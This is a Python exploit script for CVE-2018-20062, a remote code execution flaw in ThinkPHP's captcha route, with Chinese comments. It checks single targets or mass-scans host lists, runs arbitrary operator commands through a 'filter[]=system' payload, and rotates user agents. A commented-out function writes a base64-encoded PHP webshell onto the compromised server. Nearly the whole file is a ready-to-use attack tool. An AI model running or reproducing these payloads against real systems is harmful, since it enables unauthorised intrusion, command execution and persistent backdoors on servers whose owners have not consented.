import re
import sys
import base64
import argparse
import requests
from random import choice

def main(url, cmd, file):
    if url:
        POC(url)
        if cmd:
            EXP(url, cmd)
    else:
        FILE(file)

def POC(url):
    headers = {'User-Agent': choice(USER_AGENTS)}  # 随机UA
    url = f"http://{url}/index.php?s=captcha"
    payload = {"_method": "__construct", "filter[]": "phpinfo", "method": "get", "server[REQUEST_METHOD]": "-1"}
    r = requests.post(url, headers = headers, data = payload, allow_redirects = False, verify = False, timeout = 5)
    if r.status_code == 200 and "PHP Extension Build" in r.text:
        print(f"[+]{url} 存在远程代码执行漏洞")
    else:
        print(f"[-]{url} 不存在远程代码执行漏洞")

def EXP(url,cmd):
    headers = {'User-Agent': choice(USER_AGENTS)}  # 随机UA
    url = f"http://{url}/index.php?s=captcha"
    payload = {"_method": "__construct", "filter[]": "system", "method": "get", "server[REQUEST_METHOD]": f"{cmd}"}
    r = requests.post(url, headers = headers, data = payload, allow_redirects = False, verify = False, timeout = 5)
    obj = re.compile(r'(?P<value>.*?)<!DOCTYPE html>', re.S)
    chuli = obj.finditer(r.text)
    for it in chuli:
        print(it.group('value'))

def FILE(file):
    headers = {'User-Agent': choice(USER_AGENTS)}  # 随机UA
    try:
        for ip in open(file,'r'):
            ip = ip.replace('\n','')
            url = f"http://{ip}/index.php?s=captcha"
            payload = {"_method": "__construct", "filter[]": "phpinfo", "method": "get", "server[REQUEST_METHOD]": "-1"}
            r = requests.post(url, headers = headers, data = payload, allow_redirects = False, verify = False, timeout = 5)
            if r.status_code == 200 and "PHP Extension Build" in r.text:
                print(f"[+]{url} 存在远程代码执行漏洞")
            else:
                print(f"[-]{url} 不存在远程代码执行漏洞")
    except Exception as e:
        pass

# def postshell(url):
#     headers = {'User-Agent': choice(USER_AGENTS)}  # 随机UA
#     password = input("自定义小马密码>>>")
#     php = input("自定义文件名字.php>>>")
#     url1 = f"{url}index.php?s=captcha"
#     payload1 = {"_method": "__construct", "filter[]": "system", "method": "get", "server[REQUEST_METHOD]": "pwd"}
#     r = requests.post(url = url1, headers=headers, data=payload1, allow_redirects=False, verify=False, timeout=5)
#     obj = re.compile(r'(?P<value>.*?)<!DOCTYPE html>', re.S)
#     chuli = obj.finditer(r.text)
#     for it in chuli:
#         route = it.group('value')
#     xiaoma = f"<?php @assert($_POST['{password}']);?>"
#     xiaoma = base64.b64encode(xiaoma.encode('utf-8'))
#     xiaoma = xiaoma.decode('utf-8')
#     shell = f"echo -n {xiaoma} | base64 -d > {php}.php"
#     payload2 = {"_method": "__construct", "filter[]": "system", "method": "get", "server[REQUEST_METHOD]": f"{shell}"}
#     r = requests.post(url = url1, headers=headers, data=payload2, allow_redirects=False, verify=False, timeout=5)
#     if r.status_code == 500:
#         print(f"[+]小马位置：{url}{php}.php")
#     else:
#         print("[-]小马写入失败")


USER_AGENTS = [
    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; AcooBrowser; .NET CLR 1.1.4322; .NET CLR 2.0.50727)",
    "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; Acoo Browser; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 3.0.04506)",
    "Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.5; AOLBuild 4337.35; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)",
    "Mozilla/5.0 (Windows; U; MSIE 9.0; Windows NT 9.0; en-US)",
    "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 2.0.50727; Media Center PC 6.0)",
    "Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 1.0.3705; .NET CLR 1.1.4322)",
    "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.2; .NET CLR 1.1.4322; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 3.0.04506.30)",
    "Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN) AppleWebKit/523.15 (KHTML, like Gecko, Safari/419.3) Arora/0.3 (Change: 287 c9dfb30)",
    "Mozilla/5.0 (X11; U; Linux; en-US) AppleWebKit/527+ (KHTML, like Gecko, Safari/419.3) Arora/0.6",
    "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.2pre) Gecko/20070215 K-Ninja/2.1.1",
    "Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.9) Gecko/20080705 Firefox/3.0 Kapiko/3.0",
    "Mozilla/5.0 (X11; Linux i686; U;) Gecko/20070322 Kazehakase/0.4.5",
    "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko Fedora/1.9.0.8-1.fc10 Kazehakase/0.5.6",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_3) AppleWebKit/535.20 (KHTML, like Gecko) Chrome/19.0.1036.7 Safari/535.20",
    "Opera/9.80 (Macintosh; Intel Mac OS X 10.6.8; U; fr) Presto/2.9.168 Version/11.52",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.11 TaoBrowser/2.0 Safari/536.11",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.71 Safari/537.1 LBBROWSER",
    "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; LBBROWSER)",
    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; QQDownload 732; .NET4.0C; .NET4.0E; LBBROWSER)",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.84 Safari/535.11 LBBROWSER",
    "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)",
    "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; QQBrowser/7.0.3698.400)",
    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; QQDownload 732; .NET4.0C; .NET4.0E)",
    "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; SV1; QQDownload 732; .NET4.0C; .NET4.0E; 360SE)",
    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; QQDownload 732; .NET4.0C; .NET4.0E)",
    "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)",
    "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1",
    "Mozilla/5.0 (iPad; U; CPU OS 4_2_1 like Mac OS X; zh-cn) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8C148 Safari/6533.18.5",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0b13pre) Gecko/20110307 Firefox/4.0b13pre",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:16.0) Gecko/20100101 Firefox/16.0",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11",
    "Mozilla/5.0 (X11; U; Linux x86_64; zh-CN; rv:1.9.2.10) Gecko/20100922 Ubuntu/10.10 (maverick) Firefox/3.6.10"
]

headers = {'User-Agent': choice(USER_AGENTS)}  # 随机UA

def head():
    print("""
   ______     _______     ____   ___  _  ___       ____   ___   ___   __  ____
  / ___\ \   / / ____|   |___ \ / _ \/ |( _ )     |___ \ / _ \ / _ \ / /_|___ \\
 | |    \ \ / /|  _| _____ __) | | | | |/ _ \ _____ __) | | | | | | | '_ \ __) |
 | |___  \ V / | |__|_____/ __/| |_| | | (_) |_____/ __/| |_| | |_| | (_) / __/
  \____|  \_/  |_____|   |_____|\___/|_|\___/     |_____|\___/ \___/ \___/_____|
                                                                -By：白泽麟
                                                                --CVE-2018-20062
""")

if __name__ == "__main__":
    head()

    parser = argparse.ArgumentParser()
    parser.add_argument("-u", "--url", dest="url", help="Check a single URL.")
    parser.add_argument("-c", "--cmd", dest="cmd", help="Command to execute")
    parser.add_argument("-f", "--file", dest="file", help="File scanning", action='store')
    # parser.add_argument("-shell", "--postshell", dest="postshell", help="Upload postshell", action='store_true')

    args = parser.parse_args()
    url = args.url if args.url else None
    cmd = args.cmd if args.cmd else None
    file = args.file if args.file else None

    try:
        main(url, cmd, file)
    except KeyboardInterrupt:
        print("\nKeyboardInterrupt Detected.")
        print("Exiting...")
        exit(0)